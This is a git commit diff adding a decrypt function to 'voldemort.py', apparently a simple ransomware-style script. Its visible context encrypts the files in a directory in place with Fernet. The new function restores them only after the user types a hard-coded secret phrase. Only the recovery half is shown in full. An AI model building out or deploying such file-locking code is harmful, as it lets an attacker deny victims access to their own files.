5c37e9ac628b89f16978d88c2d5f7c6c3d33c40f
Alireza.Mandegar <57321058+alireza-mandegar@users.noreply.github.com>
2023-09-23 02:22:46 +0330

    decrypt function

--- voldemort.py
+++ voldemort.py
@@ -34,3 +34,29 @@ def encrypt():
         contents_encrypted = Fernet(secretkey).encrypt(contents)
         with open(file, "wb") as thefile:
             thefile.write(contents_encrypted)
+
+def decrypt():
+    files = list()
+    for file in os.listdir():
+        if file  == "voldemort.py" or file == "thekey.key":
+            continue
+        if os.path.isfile(file):
+            files.append(file)
+
+    print(files)
+
+    with open("thekey.key", "rb") as key:
+        secretkey = key.read()
+
+    secretphrase = "fymf"
+    user_phrase = str(input(f'{I} Enter the secret phrase to decrypt your files\n>>>>>> '))
+    if user_phrase == secretphrase:
+        for file in files:
+            with open(file, "rb") as thefile:
+                contents = thefile.read()
+            contents_decrypted = Fernet(secretkey).decrypt(contents)
+            with open(file, "wb") as thefile:
+                thefile.write(contents_decrypted)
+        print(f"{S} Your files are decrypred!")
+    else:
+        print(f"{E} Wrong secret phrase!")
